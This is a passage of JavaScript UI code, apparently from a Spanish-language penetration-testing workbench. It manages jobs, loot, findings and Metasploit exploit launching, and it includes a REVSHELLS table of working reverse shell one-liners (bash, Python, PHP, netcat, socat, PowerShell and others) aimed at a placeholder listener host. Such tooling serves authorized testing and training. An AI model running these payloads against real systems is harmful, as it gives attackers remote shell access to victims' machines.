    await fetch(`/api/jobs/${state.selectedJobId}/stop`, { method: 'POST' });
    if (state.activeEventSource) { state.activeEventSource.close(); state.activeEventSource = null; }
    toast('Job detenido', 'info');
    await refreshJobsList();
    document.getElementById('btn-stop-job').classList.add('d-none');
    document.getElementById('btn-parse-output').classList.remove('d-none');
}

async function clearCompletedJobs() {
    const toDelete = state.jobs.filter(j => j.status !== 'running').map(j => j.id);
    await Promise.all(toDelete.map(id => fetch(`/api/jobs/${id}`, { method: 'DELETE' })));
    state.selectedJobId = null;
    document.getElementById('term-no-selection').classList.remove('d-none');
    document.getElementById('term-job-info').classList.add('d-none');
    if (state.xterminal) state.xterminal.reset();
    await refreshJobsList();
    toast('Jobs completados eliminados', 'info');
}

function _updateAutoscrollBtn(val) {
    const btn = document.getElementById('btn-autoscroll');
    if (!btn) return;
    btn.classList.toggle('btn-outline-success', val);
    btn.classList.toggle('btn-outline-secondary', !val);
}

function handleTerminalScroll() { /* xterm manages its own scroll */ }

function toggleAutoScroll() {
    state.termAutoScroll = !state.termAutoScroll;
    _updateAutoscrollBtn(state.termAutoScroll);
    if (state.termAutoScroll && state.xterminal) state.xterminal.scrollToBottom();
}

function copyTerminalOutput() {
    if (state.xterminal) {
        const sel = state.xterminal.getSelection();
        const text = sel || (JOBS_OUTPUT_CACHE[state.selectedJobId] || []).join('\n');
        navigator.clipboard.writeText(text).then(() => toast(sel ? 'Selección copiada' : 'Output copiado', 'success'));
    }
}

async function saveOutputToHistory() {
    if (!state.activeProject || !state.selectedJobId) return;
    const job = state.jobs.find(j => j.id === state.selectedJobId);
    if (!job) return;
    const commands = [...(state.activeProject.commands || []), {
        id: crypto.randomUUID(), tool: job.tool, phase: job.phase,
        command: job.command, timestamp: new Date().toISOString(),
    }];
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ commands }) });
    state.activeProject = await res.json();
    toast('Guardado en historial', 'success');
}

// ── Auto-parse ─────────────────────────────────────────────────────────────

async function _autoParseAndSave(jobId) {
    if (!state.activeProject) return;
    try {
        const jobRes = await fetch(`/api/jobs/${jobId}`);
        if (!jobRes.ok) return;
        const job = await jobRes.json();
        if (!job.output || !job.output.length) return;

        const parseRes = await fetch('/api/parse', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tool: job.tool, output: job.output.join('\n'), rhost: state.globalVars.rhost }),
        });
        const result = await parseRes.json();
        const lootItems = result.loot || [];
        const openPorts = result.open_ports || [];
        const autoFindings = result.findings || [];

        if (!lootItems.length && !openPorts.length && !autoFindings.length) return;

        // Dedup and save loot
        const existing = state.activeProject.loot || [];
        const existingVals = new Set(existing.map(l => l.value));
        const newLoot = lootItems
            .filter(i => !existingVals.has(i.value))
            .map(i => ({ ...i, id: crypto.randomUUID(), timestamp: new Date().toISOString(), auto: true }));

        let updated = state.activeProject;
        if (newLoot.length) {
            const putRes = await fetch(`/api/projects/${state.activeProject.id}`, {
                method: 'PUT', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ loot: [...existing, ...newLoot] }),
            });
            updated = await putRes.json();
            state.activeProject = updated;
            toast(`🔍 Auto-parse: ${newLoot.length} item${newLoot.length > 1 ? 's' : ''} guardado${newLoot.length > 1 ? 's' : ''} en Loot`, 'success');
        }

        // Auto-import nmap ports into Port Map
        if (openPorts.length) {
            const rhost = state.globalVars.rhost || '';
            const portsRes = await fetch(`/api/projects/${state.activeProject.id}/ports`);
            const existingPorts = await portsRes.json();
            let added = 0;
            for (const p of openPorts) {
                if (!existingPorts.some(ep => ep.port === p.port && ep.proto === p.proto && ep.host === rhost)) {
                    existingPorts.push({ host: rhost, port: p.port, proto: p.proto, service: p.service, version: p.version || '' });
                    added++;
                }
            }
            if (added) {
                await fetch(`/api/projects/${state.activeProject.id}/ports`, {
                    method: 'PUT', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(existingPorts),
                });
                toast(`📡 ${added} puerto${added > 1 ? 's' : ''} añadido${added > 1 ? 's' : ''} al Port Map`, 'info');
                if (state.activePhase === 'map') _animatedMapRefresh();
            }
            state._lastAutoParseResult = result;
        }

        // Auto-save findings detected by parser (vuln scripts, nikto, nuclei, etc.)
        if (autoFindings.length) {
            const findRes = await fetch(`/api/projects/${state.activeProject.id}/findings`);
            const existingFindings = findRes.ok ? await findRes.json() : [];
            const existingTitles = new Set(existingFindings.map(f => f.title));
            const newFindings = autoFindings.filter(f => !existingTitles.has(f.title));
            if (newFindings.length) {
                const saved = [];
                for (const f of newFindings) {
                    const r = await fetch(`/api/projects/${state.activeProject.id}/findings`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(f),
                    });
                    if (r.ok) saved.push(await r.json());
                }
                if (saved.length) {
                    state.activeProject.findings = [...(state.activeProject.findings || []), ...saved];
                    if (state.activePhase === 'findings') renderFindings();
                }
                const critHigh = newFindings.filter(f => ['critical','high'].includes(f.severity)).length;
                const msg = critHigh
                    ? `🚨 ${critHigh} finding${critHigh > 1 ? 's' : ''} CRÍTICO/ALTO auto-detectado${critHigh > 1 ? 's' : ''}!`
                    : `🐛 ${newFindings.length} finding${newFindings.length > 1 ? 's' : ''} auto-guardado${newFindings.length > 1 ? 's' : ''}`;
                toast(msg, critHigh ? 'danger' : 'warning');
            }
        }

        // Auto-trigger Full Recon next step if active
        if (state.fullReconActive && result.suggestions?.length) {
            state._lastAutoParseResult = result;
        }
    } catch (e) { /* silent */ }
}

// ── Output Parsing (T3) ────────────────────────────────────────────────────

async function parseJobOutput() {
    if (!state.selectedJobId) return;
    const res = await fetch(`/api/jobs/${state.selectedJobId}`);
    const job = await res.json();
    const output = job.output.join('\n');

    const parseRes = await fetch('/api/parse', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tool: job.tool, output, rhost: state.globalVars.rhost }),
    });
    const result = await parseRes.json();
    state.parsedLootItems = result.loot || [];
    state._lastParsedPorts = result.open_ports || [];

    const suggestionsEl = document.getElementById('parsed-suggestions');
    if (result.suggestions && result.suggestions.length) {
        suggestionsEl.classList.remove('d-none');
        suggestionsEl.innerHTML = `<div class="alert alert-info py-2">
            <strong><i class="fas fa-lightbulb"></i> Sugerencias basadas en el output:</strong>
            <ul class="mb-0 mt-1">
                ${result.suggestions.map(s => `<li>${h(s.reason)}: <strong>${h(s.tools.join(', '))}</strong></li>`).join('')}
            </ul>
        </div>`;
    } else {
        suggestionsEl.classList.add('d-none');
    }

    if (!state.parsedLootItems.length) {
        document.getElementById('parsed-loot-list').innerHTML = '<p class="text-muted small">No se encontraron items de loot reconocibles.</p>';
    } else {
        document.getElementById('parsed-loot-list').innerHTML = state.parsedLootItems.map((item, i) => `
            <div class="parsed-loot-item">
                <input type="checkbox" class="form-check-input" id="pli-${i}" checked>
                <label for="pli-${i}" class="ms-2">
                    <span class="loot-type-badge ${item.type}">${h(item.type)}</span>
                    <code class="ms-1">${h(item.value)}</code>
                    ${item.source ? `<small class="text-muted ms-1">(${h(item.source)})</small>` : ''}
                </label>
            </div>
        `).join('');
    }
    bsParsedLoot.show();
}

async function saveParsedLoot() {
    if (!state.activeProject) return;
    const selected = state.parsedLootItems.filter((_, i) => {
        const cb = document.getElementById(`pli-${i}`);
        return cb && cb.checked;
    }).map(item => ({ ...item, id: crypto.randomUUID(), timestamp: new Date().toISOString() }));

    if (!selected.length) { toast('No hay items seleccionados', 'error'); return; }
    const loot = [...(state.activeProject.loot || []), ...selected];
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ loot }) });
    state.activeProject = await res.json();
    // Auto-import detected nmap ports into Port Map
    if (state._lastParsedPorts && state._lastParsedPorts.length) {
        const rhost = state.globalVars.rhost || '';
        const portsRes = await fetch(`/api/projects/${state.activeProject.id}/ports`);
        const existingPorts = await portsRes.json();
        let added = 0;
        for (const p of state._lastParsedPorts) {
            if (!existingPorts.some(ep => ep.port === p.port && ep.proto === p.proto && ep.host === rhost)) {
                existingPorts.push({ host: rhost, port: p.port, proto: p.proto, service: p.service, version: p.version });
                added++;
            }
        }
        if (added > 0) {
            await fetch(`/api/projects/${state.activeProject.id}/ports`, { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify(existingPorts) });
            state.ports = existingPorts;
        }
        state._lastParsedPorts = [];
    }
    bsParsedLoot.hide();
    toast(`${selected.length} items guardados en Loot`, 'success');
}

// ── Workflows (T2) ─────────────────────────────────────────────────────────

async function loadWorkflows() {
    const res = await fetch('/api/workflows');
    state.workflows = await res.json();
}

function renderWorkflowsStrip() {
    const el = document.getElementById('workflows-list');
    const COLORS = { blue: 'var(--blue)', orange: 'var(--orange)', yellow: 'var(--yellow)', red: 'var(--red)', green: 'var(--green)', purple: 'var(--purple)', violet: '#bc8cff' };
    el.innerHTML = state.workflows.map(wf => `
        <button class="wf-card" onclick="showRunWorkflowModal('${h(wf.id)}')" title="${h(wf.description)}"
                style="border-color:${COLORS[wf.color]||'var(--muted)'}">
            <i class="fas ${h(wf.icon)}" style="color:${COLORS[wf.color]||'var(--muted)'}"></i>
            <span>${h(wf.name)}</span>
        </button>
    `).join('');
}

function showRunWorkflowModal(workflowId) {
    const wf = state.workflows.find(w => w.id === workflowId);
    if (!wf) return;
    state.selectedWorkflow = wf;
    document.getElementById('wf-modal-title').innerHTML = `<i class="fas ${h(wf.icon)} text-info"></i> ${h(wf.name)}`;
    document.getElementById('wf-modal-desc').textContent = wf.description;
    document.getElementById('wf-steps-list').innerHTML = wf.steps.map((s, i) => `
        <div class="wf-step-item">
            <span class="wf-step-num">${i + 1}</span>
            <div>
                <div class="wf-step-name">${h(s.name)}</div>
                <code class="wf-step-cmd">${h(s.command)}</code>
            </div>
        </div>
    `).join('');
    document.getElementById('wf-rhost').value  = state.globalVars.rhost || '';
    document.getElementById('wf-lhost').value  = state.globalVars.lhost || '';
    document.getElementById('wf-lport').value  = state.globalVars.lport || '';
    document.getElementById('wf-domain').value = state.globalVars.domain || '';
    bsWorkflow.show();
}

async function confirmRunWorkflow() {
    if (!state.activeProject || !state.selectedWorkflow) return;
    const rhost = document.getElementById('wf-rhost').value.trim();
    if (!rhost) { toast('RHOST es obligatorio', 'error'); return; }
    bsWorkflow.hide();
    toast(`Workflow iniciado: ${state.selectedWorkflow.name}`, 'info');
    await fetch('/api/workflows/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            workflow_id: state.selectedWorkflow.id,
            project_id: state.activeProject.id,
            vars: { rhost, lhost: document.getElementById('wf-lhost').value, lport: document.getElementById('wf-lport').value, domain: document.getElementById('wf-domain').value },
        }),
    });
    if (state.activePhase === 'terminal') { await refreshJobsList(); }
    else { await loadPhase('terminal'); }
}

// ── History ────────────────────────────────────────────────────────────────

function renderHistory() {
    const commands = state.activeProject?.commands || [];
    const el = document.getElementById('history-list');
    if (!commands.length) {
        el.innerHTML = `<div class="text-center text-muted py-5"><i class="fas fa-clock-rotate-left fa-2x mb-2 d-block"></i>No hay comandos guardados</div>`;
        return;
    }
    const grouped = {};
    commands.forEach(cmd => { const ph = cmd.phase || 'other'; if (!grouped[ph]) grouped[ph] = []; grouped[ph].push(cmd); });
    el.innerHTML = Object.entries(grouped).map(([phase, cmds]) => `
        <div class="history-section-title">${h(phase)}</div>
        ${cmds.map(cmd => `
            <div class="history-item">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <div class="d-flex align-items-center gap-2">
                        <span class="history-tool">${h(cmd.tool)}</span>
                        <span class="phase-badge ${h(phase)}">${h(phase)}</span>
                    </div>
                    <div class="d-flex gap-1">
                        <button class="btn btn-sm btn-outline-success" onclick="copyHistCmd('${escAttr(cmd.command)}')" title="Copiar"><i class="fas fa-copy"></i></button>
                        <button class="btn btn-sm btn-outline-danger" onclick="deleteHistCmd('${h(cmd.id)}')" title="Eliminar"><i class="fas fa-trash"></i></button>
                    </div>
                </div>
                <div class="history-cmd">${h(cmd.command)}</div>
                <div class="history-meta">${fmtDateTime(cmd.timestamp)}</div>
            </div>
        `).join('')}
    `).join('');
}

function copyHistCmd(cmd) { navigator.clipboard.writeText(cmd).then(() => toast('Copiado', 'success')); }

async function deleteHistCmd(cmdId) {
    const commands = (state.activeProject.commands || []).filter(c => c.id !== cmdId);
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ commands }) });
    state.activeProject = await res.json();
    renderHistory();
}

async function clearHistory() {
    if (!confirm('¿Limpiar todo el historial de este proyecto?')) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ commands: [] }) });
    state.activeProject = await res.json();
    renderHistory();
    toast('Historial limpiado', 'info');
}

// ── RevShells ──────────────────────────────────────────────────────────────

const REVSHELLS = [
    { name: 'Bash TCP',          cat: 'Linux',    cmd: 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' },
    { name: 'Bash UDP',          cat: 'Linux',    cmd: 'bash -i >& /dev/udp/{lhost}/{lport} 0>&1' },
    { name: 'Python 3',          cat: 'Linux',    cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'" },
    { name: 'Python 2',          cat: 'Linux',    cmd: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
    { name: 'PHP',               cat: 'Web',      cmd: "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    { name: 'Netcat (mkfifo)',   cat: 'Linux',    cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f' },
    { name: 'Netcat (nc -e)',    cat: 'Linux',    cmd: 'nc -e /bin/bash {lhost} {lport}' },
    { name: 'Socat',             cat: 'Linux',    cmd: 'socat TCP:{lhost}:{lport} EXEC:/bin/bash' },
    { name: 'Socat (PTY)',       cat: 'Linux',    cmd: "socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane" },
    { name: 'Perl',              cat: 'Linux',    cmd: "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'" },
    { name: 'Ruby',              cat: 'Linux',    cmd: "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    { name: 'Node.js',           cat: 'Web',      cmd: "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect({lport},'{lhost}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});})()" },
    { name: 'PowerShell TCP',    cat: 'Windows',  cmd: 'powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String );$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"' },
    { name: 'cmd.exe (nc)',      cat: 'Windows',  cmd: 'nc.exe {lhost} {lport} -e cmd.exe' },
    { name: 'Listener (nc)',     cat: 'Listener', cmd: 'nc -nlvp {lport}' },
    { name: 'Listener (rlwrap)', cat: 'Listener', cmd: 'rlwrap nc -nlvp {lport}' },
    { name: 'Listener (ncat)',   cat: 'Listener', cmd: 'ncat -nlvp {lport}' },
    { name: 'Upgrade (Python)',  cat: 'Upgrade',  cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
    { name: 'Upgrade (script)',  cat: 'Upgrade',  cmd: 'script /dev/null -c bash' },
    { name: 'Upgrade (stty)',    cat: 'Upgrade',  cmd: '# After Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm; export SHELL=bash\nstty rows 50 cols 200' },
];

const RS_CAT_COLORS = { Linux: 'var(--green)', Windows: 'var(--blue)', Web: 'var(--yellow)', Listener: 'var(--purple)', Upgrade: 'var(--muted)' };

function renderRevShells() {
    const lhost = state.globalVars.lhost || 'LHOST';
    const lport = state.globalVars.lport || 'LPORT';
    const cats = [...new Set(REVSHELLS.map(s => s.cat))];
    document.getElementById('revshells-list').innerHTML = cats.map(cat => {
        const shells = REVSHELLS.filter(s => s.cat === cat);
        const color = RS_CAT_COLORS[cat] || 'var(--muted)';
        return `<div class="rs-category-title" style="color:${color}"><i class="fas fa-circle" style="font-size:7px;vertical-align:middle;margin-right:6px"></i>${cat}</div>
        ${shells.map(s => {
            const cmd = s.cmd.replace(/\{lhost\}/g, lhost).replace(/\{lport\}/g, lport);
            return `<div class="revshell-card">
                <span class="revshell-name" style="color:${color}">${h(s.name)}</span>
                <code class="revshell-cmd">${h(cmd)}</code>
                <button class="btn btn-sm btn-outline-success flex-shrink-0" onclick="copyRS('${escAttr(cmd)}')" title="Copiar"><i class="fas fa-copy"></i></button>
            </div>`;
        }).join('')}`;
    }).join('');
}

function copyRS(cmd) { navigator.clipboard.writeText(cmd).then(() => toast('Copiado', 'success')); }

// ── Loot Tracker ───────────────────────────────────────────────────────────

const LOOT_TYPES = {
    credential: { label: 'Credencial', icon: 'fa-user-secret',  color: 'var(--blue)' },
    hash:       { label: 'Hash',       icon: 'fa-hashtag',      color: 'var(--yellow)' },
    flag:       { label: 'Flag',       icon: 'fa-flag',         color: 'var(--green)' },
    key:        { label: 'Clave/Key',  icon: 'fa-key',          color: 'var(--purple)' },
    note:       { label: 'Nota',       icon: 'fa-sticky-note',  color: 'var(--muted)' },
    ad_object:  { label: 'AD Object',  icon: 'fa-sitemap',      color: 'var(--red)' },
    ad_dn:      { label: 'AD DN',      icon: 'fa-address-card', color: 'var(--orange)' },
    ip:         { label: 'IP',         icon: 'fa-network-wired',color: 'var(--blue)' },
    domain:     { label: 'Dominio',    icon: 'fa-globe',        color: 'var(--green)' },
    email:      { label: 'Email',      icon: 'fa-envelope',     color: 'var(--yellow)' },
};

function renderLoot() {
    const loot = state.activeProject?.loot || [];
    const el = document.getElementById('loot-list');
    if (!loot.length) {
        el.innerHTML = `<div class="text-center text-muted py-5"><i class="fas fa-box-open fa-2x mb-2 d-block"></i>Sin loot registrado</div>`;
        return;
    }
    const grouped = {};
    loot.forEach(item => { if (!grouped[item.type]) grouped[item.type] = []; grouped[item.type].push(item); });
    el.innerHTML = Object.entries(grouped).map(([type, items]) => {
        const t = LOOT_TYPES[type] || { label: type, icon: 'fa-box', color: 'var(--muted)' };
        return `<div class="loot-section-title" style="color:${t.color}"><i class="fas ${t.icon}"></i> ${t.label} (${items.length})</div>
        ${items.map(item => `
            <div class="loot-item">
                <div class="flex-grow-1 min-width-0">
                    <div class="loot-value">${h(item.value)}</div>
                    ${item.desc ? `<div class="loot-desc">${h(item.desc)}</div>` : ''}
                    ${item.source ? `<div class="loot-source"><i class="fas fa-crosshairs fa-xs"></i> ${h(item.source)}</div>` : ''}
                </div>
                <div class="d-flex gap-1 flex-shrink-0">
                    <button class="btn btn-sm btn-outline-success" onclick="copyLoot('${escAttr(item.value)}')" title="Copiar"><i class="fas fa-copy"></i></button>
                    <button class="btn btn-sm btn-outline-danger" onclick="deleteLoot('${h(item.id)}')" title="Eliminar"><i class="fas fa-trash"></i></button>
                </div>
            </div>`).join('')}`;
    }).join('');
}

function showAddLootModal() {
    ['loot-type','loot-value','loot-desc','loot-source'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
    document.getElementById('loot-type').value = 'credential';
    bsLoot.show();
}

async function saveLoot() {
    const value = document.getElementById('loot-value').value.trim();
    if (!value) { toast('El valor no puede estar vacío', 'error'); return; }
    const newItem = { id: crypto.randomUUID(), type: document.getElementById('loot-type').value, value, desc: document.getElementById('loot-desc').value.trim(), source: document.getElementById('loot-source').value.trim(), timestamp: new Date().toISOString() };
    const loot = [...(state.activeProject.loot || []), newItem];
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ loot }) });
    state.activeProject = await res.json();
    bsLoot.hide();
    renderLoot();
    toast('Loot añadido', 'success');
}

function copyLoot(val) { navigator.clipboard.writeText(val).then(() => toast('Copiado', 'success')); }

async function deleteLoot(itemId) {
    const loot = (state.activeProject.loot || []).filter(i => i.id !== itemId);
    const res = await fetch(`/api/projects/${state.activeProject.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ loot }) });
    state.activeProject = await res.json();
    renderLoot();
}

// ── Findings (T4) ──────────────────────────────────────────────────────────

const SEV_COLORS = { critical: '#f85149', high: '#f0883e', medium: '#d29922', low: '#3fb950', info: '#58a6ff' };
const SEV_ORDER  = ['critical', 'high', 'medium', 'low', 'info'];

async function enrichProject() {
    if (!state.activeProject) { toast('Selecciona un proyecto primero', 'error'); return; }
    const btn = document.getElementById('enrich-btn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analizando...';
    try {
        const res = await fetch(`/api/projects/${state.activeProject.id}/enrich`, { method: 'POST' });
        const data = await res.json();
        if (data.error) { toast(data.error, 'error'); return; }
        if (data.added > 0) {
            const freshRes = await fetch(`/api/projects/${state.activeProject.id}/findings`);
            if (freshRes.ok) {
                state.activeProject.findings = await freshRes.json();
                renderFindings();
            }
            toast(`Enrich: +${data.added} finding(s) — ${data.version_hits} por versión, ${data.ss_hits} searchsploit`, 'success');
        } else {
            toast('Enrich: sin nuevos hallazgos (Port Map vacío o versiones ya conocidas)', 'info');
        }
    } catch (e) {
        toast('Error en enrich: ' + e.message, 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-magnifying-glass-chart"></i> Enrich CVEs';
    }
}

function renderFindings() {
    const findings = state.activeProject?.findings || [];
    const el = document.getElementById('findings-list');

    // Severity summary bar
    const bar = document.getElementById('findings-severity-bar');
    bar.innerHTML = SEV_ORDER.map(sev => {
        const count = findings.filter(f => f.severity === sev).length;
        if (!count) return '';
        return `<span class="sev-counter" style="background:${SEV_COLORS[sev]}20;color:${SEV_COLORS[sev]};border:1px solid ${SEV_COLORS[sev]}50">${count} ${sev}</span>`;
    }).join('');

    if (!findings.length) {
        el.innerHTML = `<div class="text-center text-muted py-5"><i class="fas fa-shield-check fa-2x mb-2 d-block text-success"></i>Sin findings registrados</div>`;
        return;
    }

    const sorted = [...findings].sort((a, b) => SEV_ORDER.indexOf(a.severity) - SEV_ORDER.indexOf(b.severity));
    el.innerHTML = sorted.map(f => {
        const col = SEV_COLORS[f.severity] || '#8b949e';
        const hosts = (f.hosts || []).join(', ') || '—';
        const exploitId = `exploit-${f.id}`;
        const exploitBlock = f.exploit_cmd ? `
            <div class="mt-2">
                <div class="d-flex align-items-center gap-2 mb-1">
                    <span style="color:#f85149;font-size:0.75rem;font-weight:600"><i class="fas fa-crosshairs"></i> AUTO-EXPLOIT</span>
                    <button class="btn btn-xs btn-outline-danger py-0 px-1" onclick="copyExploit('${f.id}')" title="Copiar comando MSF"><i class="fas fa-copy"></i></button>
                    <button class="btn btn-xs btn-outline-warning py-0 px-1" onclick="runExploit('${f.id}')" title="Ejecutar en Terminal"><i class="fas fa-terminal"></i> Run</button>
                </div>
                ${f.lhost_warning ? `<div class="alert alert-warning py-1 px-2 mb-1" style="font-size:0.75rem;background:#3d2e00;border-color:#f0b72f;color:#f0b72f"><i class="fas fa-exclamation-triangle me-1"></i>${h(f.lhost_warning)}</div>` : ''}
                <pre id="${exploitId}" class="exploit-cmd-block mb-0">${h(f.exploit_cmd)}</pre>
            </div>` : '';
        return `
        <div class="finding-card" style="border-left:3px solid ${col}">
            <div class="d-flex align-items-start gap-2">
                <span class="sev-badge-sm" style="background:${col}20;color:${col};border:1px solid ${col}50">${h(f.severity?.toUpperCase())}</span>
                <div class="flex-grow-1 min-width-0">
                    <div class="finding-title">${h(f.title)}</div>
                    <div class="finding-meta">
                        ${f.cve ? `<span class="finding-tag"><i class="fas fa-tag"></i> ${h(f.cve)}</span>` : ''}
                        ${f.cvss != null ? `<span class="finding-tag">CVSS: ${f.cvss}</span>` : ''}
                        ${f.mitre_technique ? `<span class="finding-tag mitre-tag" title="${h(f.mitre_name||'')}"><i class="fas fa-shield-alt"></i> ATT&amp;CK ${h(f.mitre_technique)}</span>` : ''}
                        <span class="finding-tag"><i class="fas fa-crosshairs"></i> ${h(hosts)}</span>
                        <span class="finding-status-tag status-${h(f.status)}">${h(f.status)}</span>
                        ${f.exploit_cmd ? `<span class="finding-tag" style="color:#f85149;border-color:#f8514950"><i class="fas fa-bolt"></i> exploit listo</span>` : ''}
                    </div>
                    ${f.description ? `<div class="finding-desc mt-1">${h(f.description)}</div>` : ''}
                    ${exploitBlock}
                </div>
                <div class="d-flex gap-1 flex-shrink-0">
                    <button class="btn btn-sm btn-outline-secondary" onclick="editFinding('${h(f.id)}')" title="Editar"><i class="fas fa-pen"></i></button>
                    <button class="btn btn-sm btn-outline-danger" onclick="deleteFinding('${h(f.id)}')" title="Eliminar"><i class="fas fa-trash"></i></button>
                </div>
            </div>
        </div>`;
    }).join('');
}

function showAddFindingModal() {
    state.editingFindingId = null;
    document.getElementById('fi-modal-title').innerHTML = '<i class="fas fa-bug text-danger"></i> Añadir Finding';
    ['fi-title','fi-cve','fi-cvss','fi-hosts','fi-description','fi-evidence','fi-remediation'].forEach(id => { document.getElementById(id).value = ''; });
    document.getElementById('fi-severity').value = 'medium';
    document.getElementById('fi-status').value = 'open';
    document.getElementById('fi-editing-id').value = '';
    bsFinding.show();
}

function editFinding(findingId) {
    const f = (state.activeProject.findings || []).find(fi => fi.id === findingId);
    if (!f) return;
    state.editingFindingId = findingId;
    document.getElementById('fi-modal-title').innerHTML = '<i class="fas fa-pen text-warning"></i> Editar Finding';
    document.getElementById('fi-title').value = f.title || '';
    document.getElementById('fi-severity').value = f.severity || 'medium';
    document.getElementById('fi-status').value = f.status || 'open';
    document.getElementById('fi-cvss').value = f.cvss != null ? f.cvss : '';
    document.getElementById('fi-cve').value = f.cve || '';
    document.getElementById('fi-hosts').value = (f.hosts || []).join(', ');
    document.getElementById('fi-description').value = f.description || '';
    document.getElementById('fi-evidence').value = f.evidence || '';
    document.getElementById('fi-remediation').value = f.remediation || '';
    document.getElementById('fi-editing-id').value = findingId;
    bsFinding.show();
}

async function saveFinding() {
    const title = document.getElementById('fi-title').value.trim();
    if (!title) { toast('El título es obligatorio', 'error'); return; }
    const splitHosts = v => document.getElementById(v).value.split(',').map(s => s.trim()).filter(Boolean);
    const cvssVal = parseFloat(document.getElementById('fi-cvss').value);
    const body = {
        title,
        severity:     document.getElementById('fi-severity').value,
        status:       document.getElementById('fi-status').value,
        cvss:         isNaN(cvssVal) ? null : cvssVal,
        cve:          document.getElementById('fi-cve').value.trim(),
        hosts:        splitHosts('fi-hosts'),
        description:  document.getElementById('fi-description').value.trim(),
        evidence:     document.getElementById('fi-evidence').value.trim(),
        remediation:  document.getElementById('fi-remediation').value.trim(),
    };
    const editId = document.getElementById('fi-editing-id').value;
    let res;
    if (editId) {
        res = await fetch(`/api/projects/${state.activeProject.id}/findings/${editId}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        const updated = await res.json();
        const idx = state.activeProject.findings.findIndex(f => f.id === editId);
        if (idx >= 0) state.activeProject.findings[idx] = updated;
    } else {
        res = await fetch(`/api/projects/${state.activeProject.id}/findings`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        const created = await res.json();
        state.activeProject.findings = [...(state.activeProject.findings || []), created];
    }
    bsFinding.hide();
    renderFindings();
    toast(editId ? 'Finding actualizado' : 'Finding añadido', 'success');
}

async function deleteFinding(findingId) {
    if (!confirm('¿Eliminar este finding?')) return;
    await fetch(`/api/projects/${state.activeProject.id}/findings/${findingId}`, { method: 'DELETE' });
    state.activeProject.findings = (state.activeProject.findings || []).filter(f => f.id !== findingId);
    renderFindings();
    toast('Finding eliminado', 'info');
}

function copyExploit(findingId) {
    const f = (state.activeProject.findings || []).find(fi => fi.id === findingId);
    if (!f?.exploit_cmd) return;
    navigator.clipboard.writeText(f.exploit_cmd).then(() => toast('Exploit command copiado', 'success'));
}

async function runExploit(findingId) {
    const f = (state.activeProject.findings || []).find(fi => fi.id === findingId);
    if (!f?.exploit_cmd) return;
    const cmd = `msfconsole -q -x "${f.exploit_cmd.replace(/\n/g, '; ')}"`;
    if (!state.activeProject) return;
    switchPhase('terminal');
    await runCommand(cmd, `Exploit: ${f.title}`);
    toast('Exploit lanzado en Terminal', 'warning');
}

// ── Checklist ──────────────────────────────────────────────────────────────

const OSCP_CHECKLIST = [
    { id: 'recon_nmap_full',    phase: 'Recon',       label: 'Nmap full TCP scan (-p-)' },
